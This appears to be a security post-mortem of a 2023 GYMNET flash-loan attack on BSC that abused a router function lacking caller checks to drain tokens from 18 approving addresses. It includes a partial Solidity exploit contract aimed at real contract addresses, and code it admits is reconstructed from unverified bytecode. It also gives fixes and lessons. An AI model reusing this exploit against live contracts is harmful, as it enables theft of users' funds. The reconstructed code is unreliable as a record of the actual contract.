# GYMNET Flash Loan Liquidity Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | GYMNET |
| Date | 2023-07-05 |
| Chain | BSC (Binance Smart Chain) |
| Loss | Unknown (multiple victim addresses) |
| Attack Type | Flash Loan + Liquidity Manipulation |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x97eace4702217c1fea71cf6b79647a8ad5ddb0eb` |
| Attack Contract | `0xb8f83f38e262f28f4e7d80aa5a0216378e92baf2` |
| Vulnerable Contract | `0x6b869795937dd2b6f4e03d5a0ffd07a8ad8c095b` (GymRouter) |
| Attack TX | `0x7fe96c00880b329aa0fcb00f0ef3a0766c54e13965becf9cc5e0df6fbd0deca6` |
| Fork Block | 30,448,986 |

## 2. Vulnerability Code Analysis

The GymRouter contract had no access control over `18` victim addresses during the liquidity addition process. The attacker obtained funds via a flash loan and then exploited the GymRouter vulnerability to manipulate liquidity from each victim address.

```solidity
// Vulnerable pattern: GymRouter liquidity function with no access control
contract GymRouter {
    // Vulnerable: can be executed targeting arbitrary victim addresses
    function addLiquidityForUser(
        address user,   // Vulnerable: no caller validation
        uint256 amount,
        address token
    ) external {
        // Transfers tokens from user address without validation
        IERC20(token).transferFrom(user, address(this), amount);
        // Add liquidity
        _addLiquidity(user, amount);
    }

    // If victims had previously granted infinite approval to the Router,
    // an attacker can specify arbitrary victim addresses to drain their assets
}
```

**Vulnerability**: GymRouter had no `msg.sender == user` check when transferring user tokens, allowing arbitrary withdrawal of assets from victims who had granted infinite approval.

### On-chain Original Code

Source: Bytecode decompiled

```solidity
// Root cause: Flash Loan + Liquidity Manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x97eace4702217c1fea71cf6b79647a8ad5ddb0eb]
  │
  ├─1─▶ PancakePair.swap() — obtain flash loan
  │      [CakeLP: 0x8e1b75e6c43aEAf5055De07Ab4b76E356d7BB2db]
  │
  ├─2─▶ Acquire GYMNET tokens
  │      [GYMNET: 0x0012365F0a1E5F30a5046c680DCB21D07b15FcF7]
  │
  ├─3─▶ GymRouter.addLiquidityForUser() — repeated calls
  │      [GymRouter: 0x6b869795937dd2b6f4e03d5a0ffd07a8ad8c095b]
  │      Iterating over 18 victim addresses:
  │      Manipulate fakeUSDT/GYMNET liquidity for each victim
  │      [fakeUSDT: 0x2A1ee1278a8b64fd621B46e3ee9c08071cA3A8a5]
  │
  ├─4─▶ Remove liquidity (manipulated positions)
  │
  └─5─▶ Repay flash loan + realize profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IGymRouter {
    function addLiquidityForUser(address user, uint256 amount, address token) external;
    function removeLiquidityForUser(address user, uint256 lpAmount) external;
}

contract GYMNETExploit {
    IGymRouter gymRouter = IGymRouter(0x6b869795937dd2b6f4e03d5a0ffd07a8ad8c095b);
    IERC20 GYMNET = IERC20(0x0012365F0a1E5F30a5046c680DCB21D07b15FcF7);
    IERC20 fakeUSDT = IERC20(0x2A1ee1278a8b64fd621B46e3ee9c08071cA3A8a5);
    IPancakePair CakeLP = IPancakePair(0x8e1b75e6c43aEAf5055De07Ab4b76E356d7BB2db);
    IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // List of victim addresses (addresses that previously granted infinite approval to the Router)
    address[] victims = [
        /* 18 victim addresses */
    ];

    function testExploit() external {
        CakeLP.swap(/* flash loan parameters */);
    }

    function pancakeCall(address, uint256 amount, uint256, bytes calldata) external {
        // Manipulate liquidity from each victim address
        for (uint256 i = 0; i < victims.length; i++) {
            gymRouter.addLiquidityForUser(victims[i], amount / victims.length, address(GYMNET));
        }

        // Remove manipulated liquidity
        for (uint256 i = 0; i < victims.length; i++) {
            gymRouter.removeLiquidityForUser(victims[i], /* lpAmount */);
        }

        // Repay flash loan
        CakeLP.transfer(address(CakeLP), amount * 1003 / 1000);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Missing access control for delegated execution, infinite approval abuse |
| Affected Scope | 18 addresses that granted infinite approval to GymRouter |
| Explorer | [BSCscan](https://bscscan.com/address/0x6b869795937dd2b6f4e03d5a0ffd07a8ad8c095b) |

## 6. Security Recommendations

```solidity
// Fix 1: Validate msg.sender == user
function addLiquidityForUser(
    address user,
    uint256 amount,
    address token
) external {
    require(msg.sender == user, "Only user can add own liquidity");
    IERC20(token).transferFrom(user, address(this), amount);
    _addLiquidity(user, amount);
}

// Fix 2: Delegated signature-based authorization
function addLiquidityForUserWithSig(
    address user,
    uint256 amount,
    address token,
    uint256 deadline,
    bytes calldata signature
) external {
    bytes32 hash = keccak256(abi.encodePacked(user, amount, token, deadline, nonces[user]++));
    address signer = ECDSA.recover(hash, signature);
    require(signer == user, "Invalid signature");
    // ...
}

// Fix 3: Encourage exact-amount approvals instead of infinite approvals
// Guide users via the frontend to approve only the required amount instead of type(uint256).max
```

## 7. Lessons Learned

1. **Delegated Execution Pattern Risk**: Functions in Router contracts that execute on behalf of users must enforce `msg.sender == user` or signature-based validation.
2. **Infinite Approval Abuse**: If a contract to which users have granted infinite approval (`approve(max)`) contains a vulnerability, complete asset drainage becomes possible. DeFi protocols should guide users to revoke approvals after use.
3. **Multi-Victim Attack**: A single vulnerability was exploited to simultaneously attack 18 addresses. Router-level vulnerabilities affect all users.
4. **BSC Unverified Tokens**: The use of project-issued tokens such as `fakeUSDT` can introduce additional manipulation vectors.